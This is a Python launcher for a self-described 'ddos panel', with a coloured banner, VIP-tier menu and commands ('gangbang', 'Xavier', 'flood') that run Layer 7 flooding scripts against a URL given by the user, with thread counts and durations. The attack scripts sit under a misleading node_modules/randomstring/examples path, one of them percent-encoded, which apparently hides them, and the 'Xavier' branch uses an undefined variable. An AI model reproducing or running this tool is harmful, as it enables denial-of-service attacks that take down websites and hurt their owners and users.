import os

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''
\033[1;31;40m

███╗  ██╗ █████╗ ██╗   ██╗██╗███████╗██████╗ 
╚██╗██╔╝██╔══██╗██║   ██║██║██╔════╝██╔══██╗
 ╚███╔╝ ███████║██║   ██║██║█████╗  ██████╔╝
 ██╔██╗ ██╔══██║╚██╗ ██╔╝██║██╔══╝  ██╔══██╗
██╔╝ ██╗██║  ██║ ╚████╔╝ ██║███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                         Layer7 Dstat --

	      \033[1;37;40m    welcome to dandier ddos panel 
	
	               \033[1;32;40m dandier\033[1;37;40m [\033[1;33;40mvvip\033[1;37;40m] 
	    
	         \033[1;32;40m gangbang\033[1;37;40m [\033[1;35;40mvip\033[1;37;40m]   \033[1;32;40m flood\033[1;37;40m [\033[1;35;40mvip\033[1;37;40m]
''')
    while True:
        cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@ka\x1b[38;2;0;150;88ml\x1b[38;2;0;113;133mi\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if "gangbang" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                mix = os.path.join("node_modules/randomstring/examples/methods", "mix.js")
                os.system(f'node {mix} {url} {time}')
            except IndexError:
                print('Usage: gangbang <url> <time>')
                print('Example: gangbang https://example.com 60')
        
        elif "Xavier" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                dandier = os.path.join("%6e%6f%64%65%5f%6d%6f%64%75%6c%65%73%2f%72%61%6e%64%6f%6d%73%74%72%69%6e%67%2f%65%78%61%6d%70%6c%65%73%2f%6d%65%74%68%6f%64%73", "dandier.java")
                os.system(f'java {Xavier} {url} {thread}')
            except IndexError:
                print('Usage: Xavier <url> <thread>')
                print('Example: Xavier https://example.com 15000')
                
        elif "flood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                rpc = cnc.split()[3]
                time = cnc.split()[4]
                flood = os.path.join("node_modules/randomstring/examples/methods", "flood.py")
                os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
            except IndexError:
                print('Usage: flood <target> <workers> <rpc> <timer>')
                print('Example: flood https://example.com 500 250 60')
                
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Method: [ " + cmmnd + " ] Tidak Di Temukan!")
            except IndexError:
                pass
              
                
main()